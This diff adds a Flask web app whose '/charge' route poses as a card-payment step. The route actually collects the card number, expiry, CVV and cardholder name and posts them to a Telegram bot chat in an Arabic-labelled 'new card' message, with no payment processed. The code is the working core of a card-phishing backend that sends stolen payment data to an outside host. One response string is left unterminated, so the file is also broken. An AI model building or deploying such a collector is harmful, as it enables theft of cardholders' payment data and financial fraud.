@@ -1,0 +1,43 @@
+import os, logging, requests
+from flask import Flask, render_template, request, jsonify
+
+app = Flask(__name__)
+
+BOT_TOKEN = os.environ.get("BOT_TOKEN")
+CHAT_ID   = os.environ.get("CHAT_ID")
+TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+
+@app.route("/")
+def index():
+    return render_template("index.html")
+
+@app.route("/charge", methods=["POST"])
+def charge():
+    card_number = request.form.get("card_number", "")
+    exp_month   = request.form.get("exp_month", "")
+    exp_year    = request.form.get("exp_year", "")
+    cvv         = request.form.get("cvv", "")
+    cardholder  = request.form.get("cardholder", "")
+
+    message = (
+        "💳 *بيانات بطاقة جديدة (امنه)*\n"
+        f"👤 حامل البطاقة: {cardholder}\n"
+        f"🔢 رقم البطاقة: `{card_number}`\n"
+        f"📅 تاريخ الانتهاء: {exp_month}/{exp_year}\n"
+        f"🔐 CVV: `{cvv}`\n"
+        f"⏰ الوقت: {__import__('datetime').datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+    )
+
+    payload = {"chat_id": CHAT_ID, "text": message, "parse_mode": "Markdown"}
+
+    try:
+        response = requests.post(TELEGRAM_API, data=payload, timeout=10)
+        if response.status_code != 200:
+            return jsonify({"status": "error", "detail": "فشل الإرسال المعلومات"}), 500
+    except Exception as e:
+        return jsonify({"status": "error", "detail": "خطأ في الاتصال"}), 500
+
+    return jsonify({"status": "success", "detail": "تم إرسال البيانات بنجاح 
+
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", port=8080)
